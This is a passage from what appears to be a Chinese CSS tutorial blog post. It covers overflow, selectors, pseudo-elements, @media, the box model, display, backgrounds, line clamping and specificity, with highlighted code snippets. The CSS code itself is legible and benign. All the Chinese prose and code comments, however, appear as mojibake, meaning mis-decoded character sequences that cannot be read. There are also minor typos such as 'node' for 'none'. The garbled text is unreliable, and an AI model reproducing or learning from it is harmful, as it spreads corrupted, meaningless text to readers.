·ï¼Œä¸€ä¸ªå­—ä¸€ä¸ªå­—å¾€åæ‹¼æ¥ï¼Œå•è¡Œæ˜¾ç¤ºä¸å…¨ä¼šæŠ˜è¡Œæ˜¾ç¤ºï¼›<ul><li><code>white-space</code> å±æ€§ä½œç”¨å°±æ˜¯å‘Šè¯‰æµè§ˆå™¨é‡åˆ°ã€Œç©ºæ ¼ã€è¯¥å¦‚ä½•å¤„ç†ï¼Œè¿™é‡Œçš„ç©ºæ ¼ä¸æ˜¯å•çº¯æ„ä¹‰ä¸Šçš„ç©ºæ ¼ã€‚<ul><li><code>normal</code></li><li><code>nowrap</code></li></ul></li></ul></li></ul><h3><span id="overflow-shu-xing"><code>overflow</code> å±æ€§</span></h3><ul><li>æ§åˆ¶å¯¹äºè¶…å‡ºå¯è§†åŒºåŸŸçš„å†…å®¹å¦‚ä½•å¤„ç†</li><li><code>overflow-x</code> ï¼Œ <code>overflow-y</code></li></ul><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* é»˜è®¤å€¼ã€‚å†…å®¹ä¸ä¼šè¢«ä¿®å‰ªï¼Œä¼šå‘ˆç°åœ¨å…ƒç´ æ¡†ä¹‹å¤– */</span></span><br><span class="line"><span class="attribute">overflow</span>: visible;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å†…å®¹ä¼šè¢«ä¿®å‰ªï¼Œå¹¶ä¸”å…¶ä½™å†…å®¹ä¸å¯è§ */</span></span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* å†…å®¹ä¼šè¢«ä¿®å‰ªï¼Œæµè§ˆå™¨ä¼šæ˜¾ç¤ºæ»šåŠ¨æ¡ä»¥ä¾¿æŸ¥çœ‹å…¶ä½™å†…å®¹ */</span></span><br><span class="line"><span class="attribute">overflow</span>: scroll;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ç”±æµè§ˆå™¨å®šå¤ºï¼Œå¦‚æœå†…å®¹è¢«ä¿®å‰ªï¼Œå°±ä¼šæ˜¾ç¤ºæ»šåŠ¨æ¡ï¼ˆé»˜è®¤å€¼ï¼‰ */</span></span><br><span class="line"><span class="attribute">overflow</span>: auto;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* è§„å®šä»çˆ¶å…ƒç´ ç»§æ‰¿overflowå±æ€§çš„å€¼ */</span></span><br><span class="line"><span class="attribute">overflow</span>: inherit;</span><br></pre></td></tr></table></figure><h3><span id="qing-chu-biao-qian-mo-ren-bian-ju">æ¸…é™¤æ ‡ç­¾é»˜è®¤è¾¹è·</span></h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*æ¸…é™¤æ ‡ç­¾é»˜è®¤è¾¹è·*/</span></span><br><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="css-zhong-de-xuan-ze-qi">CSSä¸­çš„é€‰æ‹©å™¨</span></h3><p><img src="https://user-images.githubusercontent.com/3297411/129540047-12aa2048-3121-4d5d-a40d-c4d052a52bbc.png" alt="Untitled"></p><p>æ³¨æ„ï¼šå†™ CSS ä»£ç çš„æ—¶å€™ï¼Œå³ä½¿æŸä¸ªå±æ€§å†™é”™ï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šæŠ¥é”™ï¼Œåªä¼šå¿½ç•¥æ— æ³•è¯†åˆ«çš„ CSS æ ·å¼ã€‚</p><ul><li><p>æ ‡ç­¾é€‰æ‹©å™¨ï¼š å¦‚ <code>p</code> ï¼Œ <code>li</code> ç­‰</p></li><li><p>class é€‰æ‹©å™¨ï¼šå¦‚ <code>.first</code></p></li><li><p>ID é€‰æ‹©å™¨ï¼š <code>#firstid</code></p></li><li><p>é€šç”¨é€‰æ‹©å™¨ï¼š <code>*</code> ï¼Œä½œç”¨äºæ‰€æœ‰çš„æ ‡ç­¾</p></li><li><p>å±æ€§é€‰æ‹©å™¨ï¼šæ ¹æ®å±æ€§æ¥åŒ¹é…HTMLå…ƒç´ </p>  <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* åŒ¹é…æ‰€æœ‰ä½¿ç”¨å±æ€§ &quot;lefe&quot; çš„å…ƒç´  */</span></span><br><span class="line"><span class="selector-attr">[lefe]</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*åŒ¹é…æ‰€æœ‰ä½¿ç”¨å±æ€§ä¸º &quot;lefe&quot;ï¼Œä¸”å€¼ä¸º liquid çš„å…ƒç´ */</span></span><br><span class="line"><span class="selector-attr">[lefe=<span class="string">&quot;liquid&quot;</span>]</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: goldenrod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*åŒ¹é…æ‰€æœ‰ä½¿ç”¨å±æ€§ä¸º &quot;lefe&quot;ï¼Œä¸”å€¼åŒ…å« spicy çš„å…ƒç´ */</span></span><br><span class="line"><span class="selector-attr">[lefe~=<span class="string">&quot;spicy&quot;</span>]</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ç±»ä¼¼äºâ€œæ­£åˆ™è¡¨è¾¾å¼â€çš„å±æ€§é€‰æ‹©å™¨ï¼Œæ¯”å¦‚ï¼š <code>[attr^=val]</code> åŒ¹é…ä»¥ val å¼€å¤´çš„å…ƒç´ ï¼Œ <code>[attr$=val]</code> ,åŒ¹é…ä»¥ val ç»“å°¾çš„å…ƒç´ ï¼Œ <code>[attr*=val]</code> åŒ¹é…åŒ…å« val çš„å­—ç¬¦ä¸²çš„å…ƒç´ </p></li><li><p>ä¼ªé€‰æ‹©å™¨ï¼ˆpseudo-selectorsï¼‰ï¼šå®ƒåŒ…å«ä¼ªç±»ï¼ˆpseudo-classesï¼‰å’Œä¼ªå…ƒç´ ï¼ˆpseudo-elementsï¼‰ã€‚è¿™ç±»é€‰æ‹©å™¨ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„é€‰æ‹©å™¨ï¼Œå®ƒä½œä¸ºé€‰æ‹©å™¨çš„ä¸€éƒ¨åˆ†ï¼Œèµ·åˆ°é€‰æ‹©å™¨åŒ¹é…å…ƒç´ çš„é™å®šæ¡ä»¶ã€‚</p>  <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* åŒ¹é…è¶…é“¾æ¥æ ·å¼ */</span></span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* è®¿é—®åçš„çŠ¶æ€ */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* é¼ æ ‡æ‚¬åœã€ç‚¹å‡»ã€èšç„¦æ—¶çš„æ ·å¼ */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span>,</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:focus</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: darkred;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>ä¼ªå…ƒç´ ï¼ˆpseudo-elementsï¼‰é€‰æ‹©å™¨ï¼Œå®ƒä»¥â€œ :: â€ ä¸ºæ ‡è¯†ç¬¦</p>  <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::first-letter</span>&#123;</span><br><span class="line">  <span class="attribute">font-weight</span>: bold;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::first-line</span>&#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">3em</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Selects any &lt;p&gt; that is the first element</span></span><br><span class="line"><span class="comment">   among its siblings </span></span><br><span class="line"><span class="comment"> p:first-child é€‰æ‹©çš„æ˜¯å­©å­èŠ‚ç‚¹ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ p çš„å…ƒç´ </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:first</span>-child &#123;</span><br><span class="line">  <span class="attribute">color</span>: lime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>ç»„åˆé€‰æ‹©å™¨ï¼ˆCombinatorsï¼‰: è¿™ç§é€‰æ‹©å™¨å¯ä»¥ä½œç”¨äºå¤šä¸ª HTML å…ƒç´ ï¼Œæœ‰å¤šç§ç»„åˆæ–¹å¼</p><ul><li><code>A B &#123;&#125;</code> : A å…ƒç´ çš„æ‰€æœ‰åä»£å…ƒç´  B éƒ½ä¼šèµ·ä½œç”¨ã€‚</li><li><code>A &gt; B &#123;&#125;</code> : A å…ƒç´ çš„ç›´æ¥å­èŠ‚ç‚¹ä¼šèµ·ä½œç”¨ï¼Œä¹Ÿå°±æ˜¯åªé€‚ç”¨äº A èŠ‚ç‚¹çš„ç¬¬ä¸€å±‚æ‰€æœ‰çš„å­èŠ‚ç‚¹ã€‚</li><li><code>A + B &#123;&#125;</code> : åŒ¹é… A çš„ä¸‹ä¸€ä¸ªå…„å¼ŸèŠ‚ç‚¹ï¼ŒABå…·æœ‰ç›¸åŒçš„çˆ¶èŠ‚ç‚¹ï¼Œå¹¶ä¸” B ç´§è·Ÿåœ¨ A çš„åé¢ï¼›</li><li><code>A ~ B &#123;&#125;</code> : Bæ˜¯ A ä¹‹åçš„ä»»æ„ä¸€ä¸ªï¼ˆæ‰€æœ‰ï¼‰å…„å¼ŸèŠ‚ç‚¹ã€‚</li><li><code>A, B &#123;&#125;</code>ï¼šA å’Œ B å…ƒç´ å…·æœ‰åŒä¸€è§„åˆ™çš„ CSS æ ·å¼ï¼Œä¸åŒå…ƒç´ ä½¿ç”¨é€—å·éš”å¼€ã€‚</li></ul></li></ul><h3><span id="wei-xuan-ze-qi">ä¼ªé€‰æ‹©å™¨</span></h3><ol><li><p>ä¼ªç±»é€‰æ‹©å™¨ï¼šä½œç”¨æ˜¯é€‰ä¸­æŸä¸ªå…ƒç´ ä¸­ç¬¦åˆæŸäº›æ¡ä»¶çš„å…ƒç´ ã€‚ä½œç”¨äºç°æœ‰å…ƒç´ ï¼Œç›¸å½“äºç»™ç°æœ‰å…ƒç´ æ·»åŠ æŸäº›å±æ€§ã€‚ä½¿ç”¨å•ä¸ªå†’å· <code>:</code></p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-pseudo">:first</span>-child</span><br><span class="line"><span class="selector-pseudo">:not</span></span><br><span class="line"><span class="selector-pseudo">:nth-child</span>()</span><br><span class="line"><span class="selector-pseudo">:only-child</span>()</span><br><span class="line"><span class="selector-pseudo">:root</span>()</span><br><span class="line"><span class="selector-pseudo">:disabled</span></span><br></pre></td></tr></table></figure></li><li><p>ä¼ªå…ƒç´ é€‰æ‹©å™¨ï¼šä½œç”¨å°±æ˜¯ç»™ç°æœ‰å…ƒç´ æ·»åŠ æŸäº›æ–°çš„å†…å®¹ï¼Œå°±å¥½æ¯”ç»™æŸä¸ªå…ƒç´ æ·»åŠ äº†ä¸€ä¸ªæ–°çš„æ ‡ç­¾ï¼Œä½¿ç”¨2ä¸ªå†’å· <code>::</code></p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-pseudo">::first-letter</span> è¡¨ç¤ºå¯¹é¦–å­—æ¯è¿›è¡Œæ“ä½œ</span><br><span class="line"><span class="selector-pseudo">::first-line</span> å¯¹é¦–è¡Œå†…å®¹è¿›è¡Œæ“ä½œ</span><br><span class="line"><span class="selector-pseudo">::before</span> ç»™å·²çŸ¥å…ƒç´ çš„å‰é¢æ‹¼æ¥æ–°çš„å†…å®¹</span><br><span class="line"><span class="selector-pseudo">::after</span> ç»™å·²çŸ¥å…ƒç´ çš„åé¢æ‹¼æ¥æ–°çš„å†…å®¹</span><br></pre></td></tr></table></figure></li></ol><h3><span id="gui-ze">@è§„åˆ™</span></h3><p>@è§„åˆ™åœ¨CSSä¸­ç”¨äºä¼ é€’å…ƒæ•°æ®ã€æ¡ä»¶ä¿¡æ¯æˆ–å…¶ä»–æè¿°æ€§ä¿¡æ¯ã€‚å®ƒä»¬ä»¥atç¬¦å·ï¼ˆ@ï¼‰å¼€å¤´ï¼Œåè·Ÿä¸€ä¸ªæ ‡è¯†ç¬¦æ¥è¯´æ˜å®ƒæ˜¯ä»€ä¹ˆç±»å‹çš„è§„åˆ™ï¼Œç„¶åæ˜¯æŸç§ç±»å‹çš„è¯­æ³•å—ï¼Œä»¥åˆ†å·ï¼ˆï¼›ï¼‰ç»“å°¾ã€‚ç”±æ ‡è¯†ç¬¦å®šä¹‰çš„æ¯ç§ç±»å‹çš„ at è§„åˆ™éƒ½æœ‰å…¶è‡ªå·±çš„å†…éƒ¨è¯­æ³•å’Œè¯­ä¹‰ã€‚</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@charset</span> <span class="keyword">and</span> @import (metadata)</span><br><span class="line">@media <span class="keyword">or</span> @document (æ¡ä»¶ï¼ŒåµŒå¥—ç”³æ˜)</span><br><span class="line">@font-face (æè¿°ä¿¡æ¯)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢è¿™ä¸ª CSS åªé€‚ç”¨äºå±å¹•è¶…è¿‡ 800px çš„è®¾å¤‡ï¼š</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> (<span class="attribute">min-width</span>: <span class="number">801px</span>) &#123;</span><br><span class="line">  <span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">800px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@media</code> è¯­æ³•</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@media</span> mediaType <span class="keyword">and</span>|<span class="keyword">not</span>|<span class="keyword">only</span> (media feture) &#123;</span><br><span class="line">  // css</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="border">border</span></h3><ul><li>ç®€å†™å±æ€§ï¼ŒåŒ…å« border-width, border-style, border-colorã€‚</li><li><code>border-width</code>ï¼šè¡¨ç¤ºè¾¹æ¡†çš„å®½åº¦ï¼Œå¯ä»¥åˆ†åˆ«è®¾ç½®ä¸Šä¸‹å·¦å³è¾¹æ¡†ä¸ºä¸åŒçš„å®½åº¦ï¼Œæ¯”å¦‚Â border-bottom-widthï¼›</li><li><code>border-style</code>: è¡¨ç¤ºè¾¹æ¡†çš„æ ·å¼ï¼Œå¯ä»¥åˆ†åˆ«è®¾ç½®ä¸Šä¸‹å·¦å³è¾¹æ¡†ä¸ºä¸åŒçš„æ ·å¼ï¼Œæ¯”å¦‚Â border-bottom-styleï¼Œå¯ä»¥å–ä¸‹é¢å‡ ç§å€¼ï¼šnodeã€hiddenã€dottedã€dashedã€solid ç­‰ï¼›</li><li><code>border-color</code>ï¼šè¡¨ç¤ºè¾¹æ¡†çš„é¢œè‰²ï¼Œå¯ä»¥åˆ†åˆ«è®¾ç½®ä¸Šä¸‹å·¦å³è¾¹æ¡†ä¸ºä¸åŒçš„é¢œè‰²ã€‚</li></ul><h3><span id="yi-xie-wen-zi-shu-xing">ä¸€äº›æ–‡å­—å±æ€§</span></h3><p>font-size: æ–‡å­—å¤§å°ï¼›</p><p>font-weightï¼šå­—é‡ï¼Œå­—ä½“ç²—ç»†ï¼Œå¯ä»¥è¿™æ ·ç†è§£å§ï¼›</p><p>colorï¼šå­—ä½“é¢œè‰²ï¼›</p><p>text-alignï¼šå­—ä½“å¯¹é½æ–¹å¼ï¼›</p><p>text-decoration: æ–‡å­—ä¿®é¥°ï¼Œæ¯”å¦‚ä¸‹åˆ’çº¿ï¼Œåˆ é™¤çº¿ï¼›</p><p>letter-spacing: æ–‡å­—é—´è·ï¼›</p><p>line-height: è¡Œé«˜ï¼›</p><p>font-style: Â æ–‡å­—æ ·å¼ï¼Œæ¯”å¦‚æ–œä½“ï¼›</p><h3><span id="he-zi-mo-xing">ç›’å­æ¨¡å‹</span></h3><p>ä¸¤ç§ç›’å­ç±»å‹</p><ol><li>å—çº§ç›’å­ï¼ˆblockï¼‰<ul><li>å°½å¯èƒ½æ‰©å¤§å¯åˆ©ç”¨çš„ç©ºé—´</li><li>ç‹¬å ä¸€è¡Œï¼Œä¹Ÿå°±è¯´ä¸€ä¸ªå—çº§å…ƒç´ å ä¸€è¡Œ</li><li>å¯ä»¥ä½¿ç”¨ width å’Œ height å±æ€§</li><li>ä½¿ç”¨ paddingã€margin å’Œ border ä¼šå½±å“å…¶å®ƒå…ƒç´ çš„ä½ç½®</li></ul></li><li>è¡Œå†…ç›’å­ï¼ˆinlineï¼‰<ul><li>ä¸ä¼šå•è¡Œæ˜¾ç¤ºï¼Œé™¤éä¸€è¡Œæ²¡æœ‰è¶³å¤Ÿå¤šçš„ç©ºé—´ï¼Œå®ƒä¼šä¸€ä¸ªæ¥ä¸€ä¸ªåœ°æ’åˆ—ï¼›</li><li>width å’Œ height å±æ€§ä¸èµ·ä½œç”¨ï¼Œå¦‚æœç»™ span æ ‡ç­¾è®¾ç½® width æˆ– height æ—¶ï¼Œå‘ç°æ— æ•ˆï¼›</li><li>paddingã€margin å’Œ border ä¼šèµ·ä½œç”¨ï¼Œä½†ä¸ä¼šå½±å“å…¶å®ƒå…ƒç´ ã€‚</li></ul></li></ol><p>é€šè¿‡ <code>display</code> ä¿®æ”¹ç›’å­çš„æ˜¾ç¤ºæ–¹å¼</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.title</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›’æ¨¡å‹</p><p><img src="https://user-images.githubusercontent.com/3297411/129540095-2a436855-1b09-4423-9b72-1fdab450c68e.png" alt="Untitled 1"></p><ul><li>marginï¼ˆå¤–è¾¹è·ï¼‰ï¼šå®ƒè¡¨ç¤ºç›’å­ä¹‹é—´çš„è·ç¦»ï¼Œå¯ä»¥é€šè¿‡ margin-topã€margin-bottomã€margin-leftã€margin-right æ¥æ§åˆ¶å„ä¸ªæ–¹å‘çš„è¾¹è·ï¼Œ<strong>å®ƒä»¬å¯ä»¥ä¸ºè´Ÿå€¼</strong>ï¼›</li><li>borderï¼ˆè¾¹æ¡†ï¼‰ï¼šè¡¨ç¤ºç›’å­çš„è¾¹æ¡†ï¼›</li><li>paddingï¼ˆå†…è¾¹è·ï¼‰ï¼šè¡¨ç¤ºä¸å†…å®¹ä¹‹é—´çš„è·ç¦»ï¼›</li><li>contentï¼ˆå†…å®¹ï¼‰ï¼šè¡¨ç¤ºå†…å®¹çš„å¤§å°ï¼›</li></ul><p>æ¨¡å¼</p><ol><li><p>æ ‡å‡†çš„ç›’å­æ¨¡å‹</p><p>å¯¹äºè¿™ç§ç›’å­æ¨¡å¼ï¼Œç»™å®ƒè®¾ç½®çš„ width å’Œ height æ˜¯ content çš„å®½é«˜ï¼Œå½“ç»™ç›’å­æ·»åŠ  padding å’Œ border çš„æ—¶å€™ï¼Œä¼šå¢åŠ ç›’å­çš„æ•´ä½“å¤§å°ã€‚ã€Œå¤–è¾¹è·ä¸ä¼šè®¡å…¥ç›’å­çš„å¤§å°ï¼Œå®ƒåªæ˜¯è¡¨ç¤ºå¤–éƒ¨çš„è¾¹è·ã€ã€‚</p></li><li><p>è¯¡å¼‚ç›’å­æ¨¡å‹ï¼ˆThe alternative CSS box modelï¼‰</p><p>å¯¹äºè¿™ç§ç›’å­æ¨¡å¼ï¼Œç»™å®ƒè®¾ç½®çš„ width å’Œ height æ˜¯ç›’å­çš„å®½é«˜ï¼Œä¹Ÿå°±æ˜¯è¯´å†…å®¹ content çš„å®½éœ€è¦å‡å» border å’Œ padding çš„å®½ã€‚</p></li></ol><p>è°·æ­Œæµè§ˆå™¨é»˜è®¤çš„æ˜¯æ ‡å‡†çš„ç›’æ¨¡å‹ï¼Œå¯ä»¥é€šè¿‡ï¼š</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">box-sizing</span>: border-box;</span><br></pre></td></tr></table></figure><p>æ¥ä¿®æ”¹ç›’æ¨¡å‹ä¸ºè¯¡å¼‚ç›’æ¨¡å‹ã€‚</p><h3><span id="display">display</span></h3><ol><li><p><code>displayï¼šinline</code></p></li><li><p><code>displayï¼šblock</code></p></li><li><p><code>displayï¼šinline-block</code></p><p>è¿™ç§å¸ƒå±€æ–¹å¼ç»“åˆäº† inline å’Œ block è¿™ä¸¤ç§å…ƒç´ çš„ç‰¹æ€§ï¼Œå®ƒä¸å—çº§å…ƒç´ ä¸åŒçš„æ˜¯ï¼šå…ƒç´ ä¸ä¼šå•ç‹¬å ç”¨ä¸€è¡Œï¼›ç›¸åŒçš„æ˜¯ï¼šå¯ä»¥ä½¿ç”¨ width å’Œ heightï¼Œå¯ä»¥é€šè¿‡ paddingã€margin å’Œ border æ¥æ§åˆ¶å…ƒç´ çš„æ˜¾ç¤ºä½ç½®ã€‚</p><p>è¯´ç™½äº†å°±æ˜¯é™¤äº†ä¸ä¼šå•ç‹¬å ä¸€è¡Œï¼Œå…¶ä½™çš„ä¸å—çº§å…ƒç´ ä¸€è‡´ã€‚</p></li><li><p><code>displayï¼šnone</code> éšè—å…ƒç´ </p></li><li><p><code>displayï¼šflex</code> ä¸€ç»´</p></li><li><p><code>displayï¼šgrid</code> äºŒç»´</p></li></ol><h3><span id="shi-yong-tu-pian">ä½¿ç”¨å›¾ç‰‡</span></h3><ol><li><p>è®¾ç½®èƒŒæ™¯å›¾</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">background-color</span>: antiquewhite;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;./logo_suyan.png&#x27;</span>);</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">background-position</span>: center;</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br></pre></td></tr></table></figure><ul><li>background-postion: è¡¨ç¤ºèƒŒæ™¯å›¾çš„èµ·å§‹ä½ç½®ï¼›<ul><li>background-postionï¼š <code>top | left | bottom | right</code>ï¼Œåœ¨æŸä¸ªè¾¹ç¼˜çš„ä½ç½®ï¼Œå¦ä¸€ä¸ªç»´åº¦ä¸º 50%ã€‚æ¯”å¦‚ topï¼ŒèƒŒæ™¯å›¾çš„èµ·å§‹ä½ç½®ä¸ºé¡¶éƒ¨ï¼Œåœ¨Xè½´æ–¹å‘ä¸º 50%ï¼Œå±…ä¸­æ˜¾ç¤ºï¼›</li><li>background-postionï¼šcenterï¼Œå±…ä¸­èƒŒæ™¯å›¾ï¼›</li><li>background-postionï¼š25% 75%ï¼Œè®¾ç½®åŸºäºèƒŒæ™¯åŒºåŸŸçš„å¼€å§‹ä½ç½®ï¼Œå¯ä»¥ä¸ºè´Ÿå€¼ï¼›</li><li>background-postion-xï¼šèƒŒæ™¯åœ¨ x è½´ä¸Šçš„ä½ç½®ï¼›</li><li>background-postion-yï¼šèƒŒæ™¯åœ¨ y è½´ä¸Šçš„ä½ç½®ï¼›</li></ul></li><li>background-repeat: èƒŒæ™¯çš„é‡å¤æ–¹å¼ï¼Œ <code>no-repat</code> ä¸é‡å¤ï¼Œ <code>repeat</code> é‡å¤ï¼Œ <code>repat-x</code> Xè½´ä¸Šé‡å¤ï¼Œè¿˜æœ‰å…¶å®ƒå…³é”®å­—ã€‚</li><li>background-size: èƒŒæ™¯å›¾çš„å¤§å°ï¼›</li></ul></li><li><p><code>img</code> æ ‡ç­¾</p><p>è¡Œå†…ï¼ˆinlineï¼‰å…ƒç´ </p> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./images/1.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;å›¾ç‰‡&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.logo</span> &#123;</span><br><span class="line"><span class="comment">/* è¡¨ç¤ºè®¾ç½®å›¾ç‰‡çš„å®½åº¦ï¼Œå¦‚æœåªè®¾ç½®å®½åº¦ï¼Œé‚£ä¹ˆ img æ ‡ç­¾çš„é«˜åº¦ä¼šæ ¹æ®å›¾ç‰‡çš„å¤§å°è¿›è¡Œç­‰æ¯”ç¼©æ”¾ã€‚</span></span><br><span class="line"><span class="comment">       åªè®¾ç½®é«˜åº¦ä¹Ÿæ˜¯åŒæ ·çš„é“ç†ã€‚</span></span><br><span class="line"><span class="comment">       å¦‚æœå³è®¾ç½®äº†é«˜åº¦åˆè®¾ç½®äº†å®½åº¦ï¼Œé‚£ä¹ˆå›¾ç‰‡çš„é«˜åº¦å’Œå®½åº¦å³ä¸ºè®¾ç½®çš„å®½é«˜ã€‚ */</span></span><br><span class="line">    <span class="attribute">width</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="comment">/* æŒ‡å®šè¡Œå†…å…ƒç´ çš„å‚ç›´å¯¹é½æ–¹å¼ */</span></span><br><span class="line">    <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3><span id="xian-shi-duo-xing-wen-zi">æ˜¾ç¤ºå¤šè¡Œæ–‡å­—</span></h3><p>text-overflow å’Œ -webkit-line-clamp</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.singal-line</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.two-line</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: -webkit-box;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">    -webkit-line-clamp: <span class="number">2</span>;</span><br><span class="line">    -webkit-box-orient: vertical;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>text-overflowï¼šåªå¯¹å—çº§å…ƒç´ èµ·ä½œç”¨ï¼Œè¡¨ç¤ºå¯¹è¶…å‡ºæŒ‡å®šåŒºåŸŸçš„å†…å®¹è¯¥å¦‚ä½•æ˜¾ç¤º</p><ul><li>ellipsisï¼šä»¥ â€¦ çœç•¥å·æ˜¾ç¤º</li><li>clipæˆªæ–­æ˜¾ç¤º</li></ul><p>-webkit-boxï¼šwebkit çš„ CSS æ‰©å±•å±æ€§</p><h3><span id="css-quan-chong">CSSæƒé‡</span></h3><p><img src="https://user-images.githubusercontent.com/3297411/129540137-817a8c61-d9e3-4763-b984-b6a89f02f5de.png" alt="Untitled 2"></p><ul><li><code>*</code>ï¼šé€šç”¨é€‰æ‹©å™¨ï¼Œæƒé‡æœ€ä½ï¼Œå°±æ˜¯ 0ï¼Œç¬¬ 1 å¼ å›¾å°±æ˜¯æ­¤æ„ï¼›</li><li>divã€li&gt;ulã€bodyï¼šå…ƒç´ é€‰æ‹©å™¨ï¼Œæœ‰å‡ ä¸ªå€¼æƒé‡å€¼å°±æ˜¯å‡ ã€‚li&gt;ulÂ æ˜¯ä¸¤ä¸ªå…ƒç´ ï¼Œ&gt; å·ä¸ä¼šå¹²æ‰°æƒé‡è®¡ç®—ï¼›ç¬¬ 2ã€3ã€4å¼ å›¾èƒ½çœ‹æ‡‚äº†å§ï¼Œå°±æ˜¯å…ƒç´ é€‰æ‹©å™¨ï¼Œ1ä¸ªå…ƒç´ é€‰æ‹©å™¨å°±æ˜¯ 0-0-1ï¼Œ12ä¸ªå…ƒç´ é€‰æ‹©å™¨å°±æ˜¯ 0-0-12ï¼›</li><li><code>.myClass, [type=chekbox], :only-of-type</code>Â : ç±»ã€å±æ€§ã€ä¼ªç±»é€‰æ‹©å™¨ã€‚ç¬¬ 5 å¼ å›¾ï¼Œä¸€ä¸ªç±»é€‰æ‹©å™¨ï¼Œæƒé‡å€¼è¡¨ç¤ºä¸º 0-1-0ï¼›5-15å¼ å›¾èƒ½çœ‹æ‡‚äº†å§ï¼›</li><li><code>#myDiv</code>ï¼šidé€‰æ‹©å™¨ï¼Œä¸€æ¡é²¨é±¼ï¼Œæƒé‡æ¯”è¾ƒé«˜ï¼Œæƒé‡å€¼ä¸º 1-0-0ï¼›`</li><li><code>style</code>ï¼šæƒé‡å€¼æ›´é«˜ï¼Œæƒé‡å€¼ä¸º 